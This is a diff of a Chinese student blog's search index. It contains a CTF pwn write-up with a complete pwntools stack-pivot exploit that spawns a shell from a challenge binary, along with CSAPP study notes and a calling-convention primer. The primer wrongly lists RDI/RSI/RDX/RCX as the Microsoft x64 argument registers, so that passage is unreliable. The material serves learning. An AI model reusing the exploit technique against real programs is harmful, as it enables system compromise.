@@ -1,29 +1,6 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>2023VNCTF-traveler</title>
-    <url>/2023/05/12/2023VNCTF-traveler/</url>
-    <content><![CDATA[<h1 id="2023VNCTF-traveler"><a href="#2023VNCTF-traveler" class="headerlink" title="2023VNCTF-traveler"></a><font size = 10 color = 'orange'>2023VNCTF-traveler</font></h1><h2 id="1-题目分析"><a href="#1-题目分析" class="headerlink" title="1.题目分析"></a>1.题目分析</h2><p>首先老传统手艺：checksec一下：<br><img src=https://s2.loli.net/2023/05/12/N1jST5JCWyY793b.png><br>好家伙，就一个栈不可执行，<del>感觉应该不是很难</del>直接拖进IDA逆向看看</p>
-<p>逆向文件：<br><img src =https://s2.loli.net/2023/05/12/wiySZc1LbF5GVme.png><br>可以看到有明显的栈溢出点： <code>buf[32]</code>和<code>read(0,&amp;buf,48ull)</code><br>一看刚好溢出两个字节，再看程序，哇塞有个后门函数<img src = https://s2.loli.net/2023/05/12/rlmnwUByu5qLYeG.png><br>直接ret2text（只能说我是真单纯）。后面发现怎么样也打不通，再仔细一看，哇塞！原来是<font size =4><code>echo flag</code></font>（只能说离了个大谱）</p>
-<p>看来果然没那么简单，要不然我说为什么还多给了个<code>msg</code> ？看来只能另辟蹊径了。后来仔细分析了下，程序就只给了两字节的溢出值，根本就没办法制造什么ROP链，欸，等等，溢出<font size = 4 color = red face = '楷体'>两字节</font>这不刚好可以覆盖prev_rbp和ret_addr这两个地址值，所以这道应该是栈迁移。</p>
-<h2 id="2-exp构造"><a href="#2-exp构造" class="headerlink" title="2.exp构造"></a>2.exp构造</h2><p>先给出exp：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = process(<span class="string">&quot;./traveler&quot;</span>)</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./traveler&quot;</span>)</span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">fake_stack = <span class="number">0x404d00</span></span><br><span class="line">read = <span class="number">0x401216</span> </span><br><span class="line">sys_addr = elf.plt[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">p_rdi = <span class="number">0x4012c3</span></span><br><span class="line">leave = <span class="number">0x401253</span></span><br><span class="line">bss = <span class="number">0x4040a0</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;pid&quot;</span>+<span class="built_in">str</span>(proc.pidof(io)))</span><br><span class="line">io.recvuntil(<span class="string">&quot;u?\n&quot;</span>)</span><br><span class="line">p1 = <span class="string">b&#x27;a&#x27;</span>*<span class="number">32</span>+p64(fake_stack+<span class="number">0x20</span>)+p64(read)</span><br><span class="line">io.send(p1)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;fe?\n&#x27;</span>)</span><br><span class="line">io.send(<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">p3 = p64(p_rdi) + p64(bss) + p64(sys_addr) + p64(<span class="number">0</span>) + p64(fake_stack-<span class="number">0x08</span>) + p64(leave)</span><br><span class="line">io.send(p3)</span><br><span class="line">pause()</span><br><span class="line">io.recvuntil(<span class="string">&#x27;fe?\n&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
-<img src = https://s2.loli.net/2023/05/12/H5tJf8gQrAwkN2m.png>
-先构造一个`fake_stack`（也就是我们栈迁移处），然后再控制我们的rip（0x401216）回到我们的程序流。这时候我们就开辟了一个fake_stack空间。然后这时，我们就可以向这个fake_stack上构造我们的rop链了。
-
-<h2 id="3-getshell"><a href="#3-getshell" class="headerlink" title="3.getshell"></a>3.getshell</h2><img src = https://s2.loli.net/2023/05/12/Cp9XLYcZFkdbPVu.png>
-
-<p>这道题来自VNCTF，最后附上题目作者的出题手记：<a href="https://kotoriseed.github.io/post/vnctf2023-pwn/#exp">https://kotoriseed.github.io/post/vnctf2023-pwn/#exp</a><br>看到作者提到了ogg法，我甚是好奇，等我学会了再回来进行更新。</p>
-]]></content>
-      <categories>
-        <category>pwn学习</category>
-      </categories>
-      <tags>
-        <tag>pwn</tag>
-        <tag>wp</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>2023LitCTF</title>
     <url>/2023/05/13/2023LitCTF/</url>
     <content><![CDATA[<h1 id="周末参加个Litctf"><a href="#周末参加个Litctf" class="headerlink" title="周末参加个Litctf"></a>周末参加个Litctf</h1><p>然后发现了自己对堆栈的知识还是不太熟练，看来暑假有的忙活的啦。（之前只顾着赶进度，堆理论，没有太注意刷题了，导致看到题目，虽然找到了明显的漏洞，但却不会利用）所以就只做了两道签到题。&#x2F;(ㄒoㄒ)&#x2F;~~</p>
@@ -41,7 +18,8 @@
 <p>比赛就只写出这两道题了，第三道说实话真不难，但就是出不来，静态调试和动态调试的结果不一样。</p>
 <h3 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h3><p>以下纯属个人心里独白，大家可以直接退出了。</p>
 <p>这次是作为网特成员参加的第一次正式的比赛（D3那次就算了，纯属陪跑），但这第一次的出征并不完美，pwn题总体难度其实并不大，但没有ak，只做了两道水题，这个是应该我好好反省的，每天看似忙忙碌碌，最后一比赛，所有的问题都暴露：对于pwntools使用不熟练、python各种变量类型转换不熟悉、局部变量在栈上存储不了解、面对静态和动态调试不相等时的窘迫……其实这与我之前的学习侧重点有关，师兄很早之前就跟我说要多刷点题，但对于刷题我还是并没有太放心上，导致了这次比赛发现了漏洞，却不会利用。但问题暴露了就是个好事，希望下次比赛能拿出自己最好的状态。（暑假的时候也应该好好的刷刷题目）</p>
-]]></content>
+<font size =2 face=楷体 color = red >
+特别注意: 本站(lkjack.com)所有文章仅供技术学习与研究，若将其信息做其他用途，由用户本身承担全部法律及连带责任，本站不承担任何法律及连带责任，请务必遵守相关国家安全法律。</font>]]></content>
       <categories>
         <category>pwn学习</category>
       </categories>
@@ -51,13 +29,68 @@
       </tags>
   </entry>
   <entry>
-    <title>Hello world</title>
-    <url>/2023/05/07/hello-world/</url>
-    <content><![CDATA[<table><tr><td bgcolor=#f7ff05><font size = 10 face ="黑体" color = "red">破壳第一天</font></td></tr></table>
+    <title>2023VNCTF-traveler</title>
+    <url>/2023/05/12/2023VNCTF-traveler/</url>
+    <content><![CDATA[<h1 id="2023VNCTF-traveler"><a href="#2023VNCTF-traveler" class="headerlink" title="2023VNCTF-traveler"></a><font size = 10 color = 'orange'>2023VNCTF-traveler</font></h1><h2 id="1-题目分析"><a href="#1-题目分析" class="headerlink" title="1.题目分析"></a>1.题目分析</h2><p>首先老传统手艺：checksec一下：<br><img src=https://s2.loli.net/2023/05/12/N1jST5JCWyY793b.png><br>好家伙，就一个栈不可执行，<del>感觉应该不是很难</del>直接拖进IDA逆向看看</p>
+<p>逆向文件：<br><img src =https://s2.loli.net/2023/05/12/wiySZc1LbF5GVme.png><br>可以看到有明显的栈溢出点： <code>buf[32]</code>和<code>read(0,&amp;buf,48ull)</code><br>一看刚好溢出两个字节，再看程序，哇塞有个后门函数<img src = https://s2.loli.net/2023/05/12/rlmnwUByu5qLYeG.png><br>直接ret2text（只能说我是真单纯）。后面发现怎么样也打不通，再仔细一看，哇塞！原来是<font size =4><code>echo flag</code></font>（只能说离了个大谱）</p>
+<p>看来果然没那么简单，要不然我说为什么还多给了个<code>msg</code> ？看来只能另辟蹊径了。后来仔细分析了下，程序就只给了两字节的溢出值，根本就没办法制造什么ROP链，欸，等等，溢出<font size = 4 color = red face = '楷体'>两字节</font>这不刚好可以覆盖prev_rbp和ret_addr这两个地址值，所以这道应该是栈迁移。</p>
+<h2 id="2-exp构造"><a href="#2-exp构造" class="headerlink" title="2.exp构造"></a>2.exp构造</h2><p>先给出exp：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = process(<span class="string">&quot;./traveler&quot;</span>)</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./traveler&quot;</span>)</span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">fake_stack = <span class="number">0x404d00</span></span><br><span class="line">read = <span class="number">0x401216</span> </span><br><span class="line">sys_addr = elf.plt[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">p_rdi = <span class="number">0x4012c3</span></span><br><span class="line">leave = <span class="number">0x401253</span></span><br><span class="line">bss = <span class="number">0x4040a0</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;pid&quot;</span>+<span class="built_in">str</span>(proc.pidof(io)))</span><br><span class="line">io.recvuntil(<span class="string">&quot;u?\n&quot;</span>)</span><br><span class="line">p1 = <span class="string">b&#x27;a&#x27;</span>*<span class="number">32</span>+p64(fake_stack+<span class="number">0x20</span>)+p64(read)</span><br><span class="line">io.send(p1)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;fe?\n&#x27;</span>)</span><br><span class="line">io.send(<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">p3 = p64(p_rdi) + p64(bss) + p64(sys_addr) + p64(<span class="number">0</span>) + p64(fake_stack-<span class="number">0x08</span>) + p64(leave)</span><br><span class="line">io.send(p3)</span><br><span class="line">pause()</span><br><span class="line">io.recvuntil(<span class="string">&#x27;fe?\n&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+<img src = https://s2.loli.net/2023/05/12/H5tJf8gQrAwkN2m.png>
+先构造一个`fake_stack`（也就是我们栈迁移处），然后再控制我们的rip（0x401216）回到我们的程序流。这时候我们就开辟了一个fake_stack空间。然后这时，我们就可以向这个fake_stack上构造我们的rop链了。
 
-<p>欢迎来到<font size =4 color = "orange">KJ</font>的博客世界，我将会在这里更新有关于计算机的知识以及日常的生活，欢迎大家来看我的blog。</p>
-<h1 id="特别鸣谢："><a href="#特别鸣谢：" class="headerlink" title="特别鸣谢："></a><font size = 5 face = 楷体 color = red >特别鸣谢：</font></h1><p>标志设计来自：sea blue blue<br><img src = https://s2.loli.net/2023/05/09/qMPQ4ScXBnsJZoH.png></p>
-]]></content>
+<h2 id="3-getshell"><a href="#3-getshell" class="headerlink" title="3.getshell"></a>3.getshell</h2><img src = https://s2.loli.net/2023/05/12/Cp9XLYcZFkdbPVu.png>
+
+<p>这道题来自VNCTF，最后附上题目作者的出题手记：<a href="https://kotoriseed.github.io/post/vnctf2023-pwn/#exp">https://kotoriseed.github.io/post/vnctf2023-pwn/#exp</a><br>看到作者提到了ogg法，我甚是好奇，等我学会了再回来进行更新。</p>
+<font size =2 face=楷体 color = red >
+特别注意: 本站(lkjack.com)所有文章仅供技术学习与研究，若将其信息做其他用途，由用户本身承担全部法律及连带责任，本站不承担任何法律及连带责任，请务必遵守相关国家安全法律。</font>]]></content>
+      <categories>
+        <category>pwn学习</category>
+      </categories>
+      <tags>
+        <tag>pwn</tag>
+        <tag>wp</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>CSAPP Lesson 1</title>
+    <url>/2023/05/07/CSAPP-Lesson-1/</url>
+    <content><![CDATA[<h1 id="Gist-of-Lesson-1"><a href="#Gist-of-Lesson-1" class="headerlink" title="Gist of Lesson 1"></a><strong>Gist of Lesson 1</strong></h1><hr>
+<p><em>摘要：这是笔者正式学习CMU的CSAPP教程的过程总结，是属于<font color = #ffa500 face ="楷体" size = 5>边学边看</font>的方式进行写作。看看学完之后的自己和学之前的自己再操作系统上的理解有什么改变和提高，同时记录下初学者在进行学习时最开始的感受，以初学者的视角，记录下这门课程的真是学习经历</em></p>
+<h2 id="Lesson-1"><a href="#Lesson-1" class="headerlink" title="Lesson 1"></a>Lesson 1</h2><p>今天看CSAPP的第一课，虽然中间的大部分时间是讲学术诚信，对于我个上网课的没什么启发，但其中教授抛出的一个问题还是很适合我的思考，这里写下来，希望在学成之后对这个问题能有更好的理解。</p>
+<ol>
+<li>问题：</li>
+</ol>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">    <span class="type">void</span> <span class="title function_">copyij</span><span class="params">(<span class="type">int</span> src[<span class="number">2048</span>][<span class="number">2048</span>]</span></span><br><span class="line"><span class="params">                <span class="type">int</span> dst[<span class="number">2048</span>][<span class="number">2048</span>])</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> i,j;</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span> ; i&lt; <span class="number">2048</span> ; i++)</span><br><span class="line">        <span class="keyword">for</span>(j = <span class="number">0</span> ; j &lt; <span class="number">2048</span> ; j++)</span><br><span class="line">            src[i][j]=dst[i][j];</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">    <span class="type">void</span> <span class="title function_">copyij</span><span class="params">(<span class="type">int</span> src[<span class="number">2048</span>][<span class="number">2048</span>]</span></span><br><span class="line"><span class="params">                <span class="type">int</span> dst[<span class="number">2048</span>][<span class="number">2048</span>])</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> i,j;</span><br><span class="line">    <span class="keyword">for</span>(j = <span class="number">0</span> ; j&lt; <span class="number">2048</span> ; j++)</span><br><span class="line">        <span class="keyword">for</span>(i = <span class="number">0</span> ; i &lt; <span class="number">2048</span> ; i++)</span><br><span class="line">            src[i][j]=dst[i][j];</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
+<ol start="2">
+<li>分析：</li>
+</ol>
+<p>对于这两个小函数，看似在实现的逻辑上是一致的：都是把dst[i][j]值赋值给src[i][j]的值，但是在具体的代码实现上。却是相差了20倍!</p>
+<img src="https://s2.loli.net/2023/05/10/sBdKATDCnHaQIxl.png" alt="Lesson 1 question.png">
+
+<p><a href="https://www.bilibili.com/video/BV1iW411d7hd/?spm_id_from=333.337.search-card.all.click"><em><font size=1>图片来自B站UP主 刘迪望 的转载视频</font></em></a></p>
+<hr>
+<img src="https://s2.loli.net/2023/05/10/Ql5vHAE4mKo9cqw.png" alt="Lesson 1 explanation.png">
+
+<p><a href="https://www.bilibili.com/video/BV1iW411d7hd/?spm_id_from=333.337.search-card.all.click"><em><font size=1>图片来自B站UP主 刘迪望 的转载视频</font></em></a></p>
+<hr>
+<ol start="3">
+<li>总结及个人猜想：</li>
+</ol>
+<p><font size = 2>总结：Lesson 1是开课的第一节，大概地讲授了课程的重要性以及课程的大概安排，其中的这个问题让我产生了思考，但因为写下这些的时候，笔者仅仅是刚开始的小白，而这也只是一个现在自己的猜测，同时也是写给未来的自己看的。所以在语言以及思考上都是有不足的。</p>
+<p><font face="楷体"><del>个人的猜想：笔者个人认为之所以产生这样的差距是因为二维数组在储存方式上的特点所导致的:二维数组的储存是先固定第一位再排序第二位（即先固定array[i][j]中的i，然后再进行j的输入）。</del></font></font></p>
+<img src="https://s2.loli.net/2023/05/10/OUK7bZvfzFwgB9l.png" alt="Answer about array">
+
+<p><font face ="隶书" size = 1>这个是来自我的猜想，看看学成归来会有什么新的体会以及修正</font></p>
+<font size =2 face=楷体 color = red >
+特别注意: 本站(lkjack.com)所有文章仅供技术学习与研究，若将其信息做其他用途，由用户本身承担全部法律及连带责任，本站不承担任何法律及连带责任，请务必遵守相关国家安全法律。</font>]]></content>
+      <categories>
+        <category>CSAPP</category>
+      </categories>
+      <tags>
+        <tag>CSAPP</tag>
+      </tags>
   </entry>
   <entry>
     <title>CSAPP-Lesson-2</title>
@@ -104,13 +137,23 @@
 <p>对于signed int a而言，其表示为1111 1111</p>
 <p>对于unsigned int b而言，其表示为0000 0000</p>
 <p>此时进行a、b之间的比较，因为他们类型不同，所以把signed int当成unsigned进行比较，很明显，此时对于a（1111 1111）是为unsigned int中的最大值。所以1111 1111 &lt; 0000 0000是错误的，所以返回值为0。</p>
-]]></content>
+<font size =2 face=楷体 color = red >
+特别注意: 本站(lkjack.com)所有文章仅供技术学习与研究，若将其信息做其他用途，由用户本身承担全部法律及连带责任，本站不承担任何法律及连带责任，请务必遵守相关国家安全法律。</font>]]></content>
       <categories>
         <category>CSAPP</category>
       </categories>
       <tags>
         <tag>CSAPP</tag>
       </tags>
+  </entry>
+  <entry>
+    <title>Hello world</title>
+    <url>/2023/05/07/hello-world/</url>
+    <content><![CDATA[<table><tr><td bgcolor=#f7ff05><font size = 10 face ="黑体" color = "red">破壳第一天</font></td></tr></table>
+
+<p>欢迎来到<font size =4 color = "orange">KJ</font>的博客世界，我将会在这里更新有关于计算机的知识以及日常的生活，欢迎大家来看我的blog。</p>
+<h1 id="特别鸣谢："><a href="#特别鸣谢：" class="headerlink" title="特别鸣谢："></a><font size = 5 face = 楷体 color = red >特别鸣谢：</font></h1><p>标志设计来自：sea blue blue<br><img src = https://s2.loli.net/2023/05/09/qMPQ4ScXBnsJZoH.png></p>
+]]></content>
   </entry>
   <entry>
     <title>unlink的利用</title>
@@ -181,7 +224,8 @@
 <img src = https://s2.loli.net/2023/06/17/VX4PtmSb3F8o7YR.gif width =200>
 
 <p>下个博客更新细讲 .&lt;_&lt;.</p>
-]]></content>
+<font size =2 face=楷体 color = red >
+特别注意: 本站(lkjack.com)所有文章仅供技术学习与研究，若将其信息做其他用途，由用户本身承担全部法律及连带责任，本站不承担任何法律及连带责任，请务必遵守相关国家安全法律。</font>]]></content>
       <categories>
         <category>-pwn学习</category>
       </categories>
@@ -240,7 +284,8 @@
 <img src=https://s2.loli.net/2023/06/20/q5NtlJyDViSd1eg.png>
 
 <p>注意：fastbins为单链表存储。unsortedbin、smallbins、largebins都是双向循环链表存储。</p>
-]]></content>
+<font size =2 face=楷体 color = red >
+特别注意: 本站(lkjack.com)所有文章仅供技术学习与研究，若将其信息做其他用途，由用户本身承担全部法律及连带责任，本站不承担任何法律及连带责任，请务必遵守相关国家安全法律。</font>]]></content>
       <categories>
         <category>-pwn学习</category>
       </categories>
@@ -249,42 +294,82 @@
       </tags>
   </entry>
   <entry>
-    <title>CSAPP Lesson 1</title>
-    <url>/2023/05/07/CSAPP-Lesson-1/</url>
-    <content><![CDATA[<h1 id="Gist-of-Lesson-1"><a href="#Gist-of-Lesson-1" class="headerlink" title="Gist of Lesson 1"></a><strong>Gist of Lesson 1</strong></h1><hr>
-<p><em>摘要：这是笔者正式学习CMU的CSAPP教程的过程总结，是属于<font color = #ffa500 face ="楷体" size = 5>边学边看</font>的方式进行写作。看看学完之后的自己和学之前的自己再操作系统上的理解有什么改变和提高，同时记录下初学者在进行学习时最开始的感受，以初学者的视角，记录下这门课程的真是学习经历</em></p>
-<h2 id="Lesson-1"><a href="#Lesson-1" class="headerlink" title="Lesson 1"></a>Lesson 1</h2><p>今天看CSAPP的第一课，虽然中间的大部分时间是讲学术诚信，对于我个上网课的没什么启发，但其中教授抛出的一个问题还是很适合我的思考，这里写下来，希望在学成之后对这个问题能有更好的理解。</p>
-<ol>
-<li>问题：</li>
-</ol>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">    <span class="type">void</span> <span class="title function_">copyij</span><span class="params">(<span class="type">int</span> src[<span class="number">2048</span>][<span class="number">2048</span>]</span></span><br><span class="line"><span class="params">                <span class="type">int</span> dst[<span class="number">2048</span>][<span class="number">2048</span>])</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> i,j;</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span> ; i&lt; <span class="number">2048</span> ; i++)</span><br><span class="line">        <span class="keyword">for</span>(j = <span class="number">0</span> ; j &lt; <span class="number">2048</span> ; j++)</span><br><span class="line">            src[i][j]=dst[i][j];</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">    <span class="type">void</span> <span class="title function_">copyij</span><span class="params">(<span class="type">int</span> src[<span class="number">2048</span>][<span class="number">2048</span>]</span></span><br><span class="line"><span class="params">                <span class="type">int</span> dst[<span class="number">2048</span>][<span class="number">2048</span>])</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> i,j;</span><br><span class="line">    <span class="keyword">for</span>(j = <span class="number">0</span> ; j&lt; <span class="number">2048</span> ; j++)</span><br><span class="line">        <span class="keyword">for</span>(i = <span class="number">0</span> ; i &lt; <span class="number">2048</span> ; i++)</span><br><span class="line">            src[i][j]=dst[i][j];</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
-<ol start="2">
-<li>分析：</li>
-</ol>
-<p>对于这两个小函数，看似在实现的逻辑上是一致的：都是把dst[i][j]值赋值给src[i][j]的值，但是在具体的代码实现上。却是相差了20倍!</p>
-<img src="https://s2.loli.net/2023/05/10/sBdKATDCnHaQIxl.png" alt="Lesson 1 question.png">
-
-<p><a href="https://www.bilibili.com/video/BV1iW411d7hd/?spm_id_from=333.337.search-card.all.click"><em><font size=1>图片来自B站UP主 刘迪望 的转载视频</font></em></a></p>
+    <title>逆向入门1</title>
+    <url>/2023/06/20/%E9%80%86%E5%90%91%E5%85%A5%E9%97%A81/</url>
+    <content><![CDATA[<p>在学习pwn的过程中，发现有些东西和re是十分有联系的。所以我就想了想，不如把re也一起修了吧，反正也是二进制。搞双修岂不美哉。</p>
+<h1 id="逆向入门"><a href="#逆向入门" class="headerlink" title="逆向入门"></a>逆向入门</h1><h2 id="函数调用参数的调用规定"><a href="#函数调用参数的调用规定" class="headerlink" title="函数调用参数的调用规定"></a>函数调用参数的调用规定</h2><p>Visual C&#x2F;C++ 编译器支持下列调用约定。</p>
+<table>
+<thead>
+<tr>
+<th>关键字</th>
+<th>堆栈清理</th>
+<th>参数传递</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>__cdecl</td>
+<td>调用方</td>
+<td>在堆栈上按相反顺序推送参数（从右到左）</td>
+</tr>
+<tr>
+<td>__clrcall</td>
+<td>不适用</td>
+<td>按顺序将参数加载到 CLR 表达式堆栈上（从左到右）。</td>
+</tr>
+<tr>
+<td>__stdcall</td>
+<td>被调用方</td>
+<td>在堆栈上按相反顺序推送参数（从右到左）</td>
+</tr>
+<tr>
+<td>__fastcall</td>
+<td>被调用方</td>
+<td>存储在寄存器中，然后在堆栈上推送</td>
+</tr>
+<tr>
+<td>__thiscall</td>
+<td>被调用方</td>
+<td>在堆栈上推送；存储在 ECX 中的 this 指针</td>
+</tr>
+<tr>
+<td>__vectorcall</td>
+<td>被调用方</td>
+<td>存储在寄存器中，然后按相反顺序在堆栈上推送（从右到左）</td>
+</tr>
+</tbody></table>
+<p>表格来自微软<a href="https://learn.microsoft.com/zh-cn/cpp/cpp/argument-passing-and-naming-conventions?view=msvc-170">VS文档</a></p>
 <hr>
-<img src="https://s2.loli.net/2023/05/10/Ql5vHAE4mKo9cqw.png" alt="Lesson 1 explanation.png">
-
-<p><a href="https://www.bilibili.com/video/BV1iW411d7hd/?spm_id_from=333.337.search-card.all.click"><em><font size=1>图片来自B站UP主 刘迪望 的转载视频</font></em></a></p>
+<h3 id="cdecl"><a href="#cdecl" class="headerlink" title="__cdecl :"></a>__cdecl :</h3><p>参数<strong>从右往左</strong>依次压入栈中，调用完毕后，由调用者负责将这些压入的参数清除，返回值位于 EAX 寄存器中。不执行任何大小写转换。</p>
+<p>名称修饰约定：下划线字符 (_) 作为名称的前缀，导出使用 C 链接的 __cdecl 函数时除外。</p>
+<h3 id="stdcal"><a href="#stdcal" class="headerlink" title="__stdcal :"></a>__stdcal :</h3><p>参数<strong>从右往左</strong>依次压入栈中，调用完毕后，由被调用者负责将这些压入的参数清除，返回值位于 EAX 寄存器中。不执行任何大小写转换。</p>
+<p>名称修饰约定：下划线 (_) 是名称的前缀。名称后跟后面是自变量列表中的字节数（采用十进制）的符号 (@) 。因此，声明为int func(int a,double b)的函数按如下所示进行修饰：_func@12</p>
+<p>注意： __cdecl 是调用者负责栈中参量的清理，故不需要知道参数的个数，若需要实现变参函数，则需要调用此函数。而 __stdcall 是被调用者清除堆栈的参数，所以必须知道参数个数(栈空间的大小)。也正是因为 __cdecl 是调用者恢复堆栈的，假设有一百个不同的函数调用函数B，那么内存中就有一百个恢复堆栈的代码，而 __stdcall 是被调用者恢复堆栈，只有在函数代码的结尾出现一次恢复堆栈的代码，所以节约空间。</p>
 <hr>
-<ol start="3">
-<li>总结及个人猜想：</li>
-</ol>
-<p><font size = 2>总结：Lesson 1是开课的第一节，大概地讲授了课程的重要性以及课程的大概安排，其中的这个问题让我产生了思考，但因为写下这些的时候，笔者仅仅是刚开始的小白，而这也只是一个现在自己的猜测，同时也是写给未来的自己看的。所以在语言以及思考上都是有不足的。</p>
-<p><font face="楷体"><del>个人的猜想：笔者个人认为之所以产生这样的差距是因为二维数组在储存方式上的特点所导致的:二维数组的储存是先固定第一位再排序第二位（即先固定array[i][j]中的i，然后再进行j的输入）。</del></font></font></p>
-<img src="https://s2.loli.net/2023/05/10/OUK7bZvfzFwgB9l.png" alt="Answer about array">
+<h3 id="thiscall"><a href="#thiscall" class="headerlink" title="__thiscall :"></a>__thiscall :</h3><p>该调用约定是用于 x86 体系结构上的 C++ 类成员函数。由被调用方清理堆栈。 自变量将<strong>从右到左</strong>推送到堆栈中。 this 指针通过 ECX 传递，而不是在堆栈上传递。</p>
+<p>简而言之， __thiscall 是关于类的调用方式，最大的不同点在于 __thiscall 对每个函数都增加了一个类指针( this 指针)。</p>
+<hr>
+<h3 id="fastcall"><a href="#fastcall" class="headerlink" title="__fastcall :"></a>__fastcall :</h3><p>__fastcall在参数传递时，尽量使用寄存器来进行函数参数的传递，此调用约定仅适用于 x86 体系的结构。在自变量列表中按<strong>从左到右</strong>的顺序找到的前两个 DWORD 或更小自变量将在 ECX 和 EDX 寄存器中传递；所有其他自变量在堆栈上<strong>从右向左</strong>传递。</p>
+<p>名称修饰约定 At 符号 (@) 是名称的前缀；参数列表中的字节数（在十进制中）前面的 at 符号是名称的后缀。</p>
+<hr>
+<h3 id="x64-架构下-Microsoft-和-MacOS-的区别-："><a href="#x64-架构下-Microsoft-和-MacOS-的区别-：" class="headerlink" title="x64 架构下 Microsoft 和 MacOS 的区别 ："></a>x64 架构下 Microsoft 和 MacOS 的区别 ：</h3><p>Microsoft x64 : 前四个参数放入 RDI &#x2F; RSI &#x2F; RDX &#x2F; RCX 这四个寄存器中，剩下的参数从右到左依次压入栈中。</p>
+<p>SystemV x64 : 适用于 MacOS 、 Linux 比 Microsoft 多两个寄存器(R8、R9) , 剩下的参数从右到左依次压入栈中。</p>
+<h3 id="x86-和-x64-两者的区别-："><a href="#x86-和-x64-两者的区别-：" class="headerlink" title="x86 和 x64 两者的区别 ："></a>x86 和 x64 两者的区别 ：</h3><p>这里 pwn 选手应该就是十分熟悉了，函数调用栈可是 pwn 入门必定绕不开的坎，这里就简单讲讲吧。</p>
+<p><strong>Linux系统下</strong></p>
+<p>x86 在函数调用栈时，直接压入栈中。</p>
+<p>x64 在函数调用栈时，函数的参数在call的时候会先进入rdi 、 rsi 、rdx 、rcx 、r8 、r9 这六个寄存器，等他们满了之后，再压入栈中。</p>
+<img src=https://s2.loli.net/2023/06/20/DZBQVqmg2pSfkTA.png>
 
-<p><font face ="隶书" size = 1>这个是来自我的猜想，看看学成归来会有什么新的体会以及修正</font></p>
-]]></content>
+<p>这时候，就不能不扔上一张我画的破图了。这张图应该挺详细的解释了函数调用栈的过程。</p>
+<img src=https://s2.loli.net/2023/06/20/1sZGV7v65oiXagB.png>
+
+<p>以及一张我珍藏已久的好图,是汇编语言下的函数调用栈。(好像是我截自ctfwiki上的图)</p>
+<font size =2 face=楷体 color = red >
+特别注意: 本站(lkjack.com)所有文章仅供技术学习与研究，若将其信息做其他用途，由用户本身承担全部法律及连带责任，本站不承担任何法律及连带责任，请务必遵守相关国家安全法律。</font>]]></content>
       <categories>
-        <category>CSAPP</category>
+        <category>-逆向学习</category>
       </categories>
       <tags>
-        <tag>CSAPP</tag>
+        <tag>-re -逆向学习</tag>
       </tags>
   </entry>
   <entry>
